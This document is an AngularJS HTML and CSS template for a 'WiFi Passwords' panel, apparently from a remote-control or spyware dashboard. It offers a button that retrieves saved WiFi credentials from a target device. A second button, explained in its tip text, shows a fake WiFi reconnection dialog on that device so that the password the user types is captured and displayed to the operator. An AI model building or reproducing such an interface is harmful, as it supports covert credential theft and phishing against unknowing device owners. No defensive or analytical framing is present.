<div class="wifi-panel">
    <div class="wifi-header">
        <div class="wifi-header__info">
            <h3 class="wifi-header__title">
                <i class="wifi icon" style="color: #2196f3;"></i>
                WiFi Passwords
            </h3>
            <p class="wifi-header__subtitle">Retrieve saved WiFi network credentials</p>
        </div>
        <div class="wifi-header__actions">
            <button class="btn btn--warning" ng-click="promptWifiPassword()" title="Show fake WiFi dialog to capture password">
                <i class="user secret icon"></i>
                Prompt Password
            </button>
            <button class="btn btn--primary" ng-click="getWifiPasswords()">
                <i class="key icon"></i>
                Get Passwords
            </button>
        </div>
    </div>

    <div class="wifi-info-box" ng-if="capturedPassword">
        <i class="check circle icon" style="color: #4caf50;"></i>
        <div class="info-content">
            <strong>Password Captured!</strong>
            <p>SSID: <strong>{{capturedPassword.ssid}}</strong> | Password: <code>{{capturedPassword.password}}</code></p>
        </div>
    </div>

    <div class="wifi-tip">
        <i class="lightbulb icon"></i>
        <div class="tip-content">
            <strong>Tip: Use "Prompt Password"</strong>
            <p>Shows a fake WiFi reconnection dialog on the device. When the user enters their password, it will be captured here.</p>
        </div>
    </div>

    <div class="wifi-content">
        <div class="wifi-loading" ng-if="isLoading">
            <div class="spinner"></div>
            <p>Retrieving WiFi passwords...</p>
        </div>

        <div class="wifi-list" ng-if="!isLoading && wifiNetworks.length > 0">
            <div class="wifi-item" ng-repeat="network in wifiNetworks">
                <div class="wifi-item__icon">
                    <i class="wifi icon"></i>
                </div>
                <div class="wifi-item__info">
                    <span class="wifi-item__ssid">{{network.ssid}}</span>
                    <span class="wifi-item__security">{{network.security || 'Unknown'}}</span>
                </div>
                <div class="wifi-item__password">
                    <span class="password-text" ng-class="{'password-hidden': !network.showPassword}">
                        {{network.showPassword ? network.password : '••••••••'}}
                    </span>
                    <button class="btn btn--icon btn--ghost" ng-click="network.showPassword = !network.showPassword" title="Toggle visibility">
                        <i ng-class="network.showPassword ? 'eye slash icon' : 'eye icon'"></i>
                    </button>
                    <button class="btn btn--icon btn--ghost" ng-click="copyPassword(network.password)" title="Copy">
                        <i class="copy icon"></i>
                    </button>
                    <button class="btn btn--icon btn--warning" ng-click="promptPasswordForNetwork(network.ssid)" title="Prompt for password">
                        <i class="key icon"></i>
                    </button>
                </div>
            </div>
        </div>

        <div class="wifi-empty" ng-if="!isLoading && wifiNetworks.length === 0 && !error">
            <i class="wifi icon"></i>
            <h4>No WiFi Networks</h4>
            <p>Click "Get Passwords" to retrieve saved WiFi credentials</p>
        </div>

        <div class="wifi-error" ng-if="error">
            <i class="exclamation circle icon"></i>
            <h4>{{error.title || 'Error'}}</h4>
            <p>{{error.message}}</p>
        </div>
    </div>
</div>

<style>
    .wifi-panel {
        height: 100%;
        display: flex;
        flex-direction: column;
        padding: 20px;
    }
    
    .wifi-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 16px;
    }
    
    .wifi-header__title {
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 18px;
        font-weight: 600;
        color: var(--text-primary);
        margin: 0;
    }
    
    .wifi-header__subtitle {
        margin: 4px 0 0;
        font-size: 12px;
        color: var(--text-muted);
    }
    
    .wifi-warning {
        display: flex;
        align-items: flex-start;
        gap: 12px;
        padding: 16px;
        background: rgba(255, 152, 0, 0.1);
        border: 1px solid rgba(255, 152, 0, 0.3);
        border-radius: var(--radius-md);
        margin-bottom: 20px;
    }
    
    .wifi-warning i {
        font-size: 20px;
        color: #ff9800;
        flex-shrink: 0;
    }
    
    .warning-content strong {
        display: block;
        font-size: 13px;
        color: #ff9800;
        margin-bottom: 4px;
    }
    
    .warning-content p {
        margin: 0;
        font-size: 12px;
        color: var(--text-secondary);
    }
    
    .wifi-content {
        flex: 1;
        background: var(--bg-card);
        border: 1px solid var(--border-color);
        border-radius: var(--radius-lg);
        overflow: hidden;
    }
    
    .wifi-list {
        padding: 12px;
    }
    
    .wifi-item {
        display: flex;
        align-items: center;
        gap: 14px;
        padding: 16px;
        background: var(--bg-tertiary);
        border-radius: var(--radius-md);
        margin-bottom: 8px;
    }
    
    .wifi-item:last-child {
        margin-bottom: 0;
    }
    
    .wifi-item__icon {
        width: 44px;
        height: 44px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(33, 150, 243, 0.15);
        border-radius: var(--radius-md);
        color: #2196f3;
        font-size: 18px;
    }
    
    .wifi-item__info {
        flex: 1;
    }
    
    .wifi-item__ssid {
        display: block;
        font-size: 14px;
        font-weight: 600;
        color: var(--text-primary);
    }
    
    .wifi-item__security {
        display: block;
        font-size: 11px;
        color: var(--text-muted);
        margin-top: 2px;
    }
    
    .wifi-item__password {
        display: flex;
        align-items: center;
        gap: 8px;
    }
    
    .password-text {
        font-family: var(--font-mono);
        font-size: 13px;
        color: var(--accent-success);
        padding: 6px 12px;
        background: var(--bg-secondary);
        border-radius: var(--radius-sm);
        min-width: 120px;
    }
    
    .password-hidden {
        color: var(--text-muted);
    }
    
    .wifi-loading,
    .wifi-empty,
    .wifi-error {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 60px;
        text-align: center;
        color: var(--text-muted);
    }
    
    .wifi-empty > i,
    .wifi-error > i {
        font-size: 48px;
        opacity: 0.3;
        margin-bottom: 16px;
    }
    
    .wifi-error {
        color: var(--accent-danger);
    }
    
    .wifi-error > i {
        opacity: 1;
    }
    
    .wifi-loading .spinner {
        width: 40px;
        height: 40px;
        border: 3px solid var(--bg-tertiary);
        border-top-color: var(--accent-primary);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin-bottom: 16px;
    }
    
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    
    .wifi-info-box,
    .wifi-tip {
        display: flex;
        align-items: flex-start;
        gap: 12px;
        padding: 16px;
        border-radius: var(--radius-md);
        margin-bottom: 16px;
    }
    
    .wifi-info-box {
        background: rgba(76, 175, 80, 0.1);
        border: 1px solid rgba(76, 175, 80, 0.3);
    }
    
    .wifi-tip {
        background: rgba(33, 150, 243, 0.1);
        border: 1px solid rgba(33, 150, 243, 0.3);
    }
    
    .wifi-info-box i,
    .wifi-tip i {
        font-size: 20px;
        flex-shrink: 0;
    }
    
    .wifi-tip i {
        color: #2196f3;
    }
    
    .info-content strong,
    .tip-content strong {
        display: block;
        font-size: 13px;
        margin-bottom: 4px;
    }
    
    .info-content strong {
        color: #4caf50;
    }
    
    .tip-content strong {
        color: #2196f3;
    }
    
    .info-content p,
    .tip-content p {
        margin: 0;
        font-size: 12px;
        color: var(--text-secondary);
    }
    
    .info-content code {
        background: var(--bg-secondary);
        padding: 2px 6px;
        border-radius: 4px;
        font-family: var(--font-mono);
        color: #4caf50;
    }
</style>

